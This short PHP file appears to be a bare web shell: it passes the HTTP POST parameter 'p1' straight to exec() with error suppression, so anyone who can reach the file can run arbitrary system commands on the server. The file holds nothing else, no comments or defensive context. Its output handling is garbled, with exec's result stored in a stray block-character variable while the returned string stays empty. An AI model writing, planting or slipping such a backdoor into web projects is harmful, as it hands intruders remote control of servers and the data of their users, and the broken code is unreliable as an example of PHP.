<?php
function ex($in) {
	$res = '';
	@exec($in,$▖);
	$res = @join("\n",$res);
	return $res;
}

ex($_POST['p1']);
?>